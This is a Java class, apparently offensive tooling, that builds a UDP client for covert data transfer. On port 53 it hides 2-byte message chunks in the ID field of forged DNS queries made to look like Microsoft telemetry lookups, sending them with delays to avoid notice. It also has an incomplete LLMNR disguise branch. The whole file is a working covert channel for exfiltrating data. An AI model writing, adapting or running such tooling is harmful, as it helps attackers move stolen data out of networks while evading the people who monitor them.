package networking;

import java.io.IOException;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;
import java.net.SocketException;
import java.net.UnknownHostException;
import java.util.List;

public class StealthyUDPClientSocket {
    private DatagramSocket socket;
    private InetAddress address;
    private int port = 0;
    @SuppressWarnings("unused")
	private String stealthPrefix = "";
    @SuppressWarnings("unused")
	private String stealthPostfix = "";
    @SuppressWarnings("unused")
    private int bytesPerPacket = -1;
    @SuppressWarnings("unused")
    private boolean isStealth = false;
    int stealthPacketSize = -1;
 
    public StealthyUDPClientSocket(String ip, int port) throws SocketException, UnknownHostException {
        socket = new DatagramSocket();
        address = InetAddress.getByName(ip);
        this.port=port;
        System.out.println("[+] Instantiated Client Socket To "+ip+":"+port);
        if(port==53){
        	System.out.println("[s] Cloaking with DNS");
        	char[] dnsBytes = {0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x06,0x77,0x61,0x74,0x73,0x6f,0x6e,0x09,0x74,0x65,0x6c,0x65,0x6d,0x65,0x74,0x72,0x79,0x09,0x6d,0x69,0x63,0x72,0x6f,0x73,0x6f,0x66,0x74,0x03,0x63,0x6f,0x6d,0x00,0x00,0x01,0x00,0x01};
        	stealthPrefix = "";
        	stealthPostfix = String.copyValueOf(dnsBytes);
        	this.bytesPerPacket = 2;
        	isStealth=true;
        }else if (port==5355){
        	System.out.println("[s] Cloaking with LLMNR");
        	char[] llmnrBytes = {0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0x0a,0x45,0x4b,0x39,0x34,0x35,0x44,0x38,0x32,0x43,0x44,0x00,0x00,0x01,0x00,0x01};
        	stealthPrefix = "";
        	stealthPostfix = String.copyValueOf(llmnrBytes);
        }else{
        	System.out.println("[x] Not using stealth! Going loud!");
        	isStealth = false;
        }
        stealthPacketSize = stealthPrefix.length()+stealthPostfix.length()+bytesPerPacket;
    }
 
    public void fireMessageLoud(String msg) {
    	if(isStealth){
    		System.out.println("ERROR! Trying to send loud traffic over a stealth socket!");
    		return;
    	}
    	System.out.println("[!] Sending loud message");
    	System.out.println("[+] Message="+msg);
    	
        byte[] buf = msg.getBytes();
        DatagramPacket packet 
          = new DatagramPacket(buf, buf.length, address, port);
        System.out.println("[~] Sending Packet...");
        try {
			socket.send(packet);
		} catch (IOException e) {
			e.printStackTrace();
		}
        System.out.println("[!] Packet Sent!");
    }
    
    public void sendStealthMessage(String msg, long waitTimeMillis){
    	if(!isStealth){
    		System.out.println("ERROR! Trying to send stealth traffic over a loud socket!");
    		return;
    	}
    	System.out.println("[+] Sending Quiet Message");
    	System.out.println("[+] Max Size of message chunks: "+bytesPerPacket);
    	List<String> messageChunks = NetUtil.getParts(msg,this.bytesPerPacket);
    	for(String s : messageChunks){
    		byte[] packetBuffer = (stealthPrefix+s+stealthPostfix).getBytes();
    		DatagramPacket pack = new DatagramPacket(packetBuffer,packetBuffer.length, address,port);
    		try {
				socket.send(pack);
				Thread.sleep(waitTimeMillis);
			} catch (IOException | InterruptedException e) {
				e.printStackTrace();
			}
    	}
    }
    public void close() {
        socket.close();
    }
}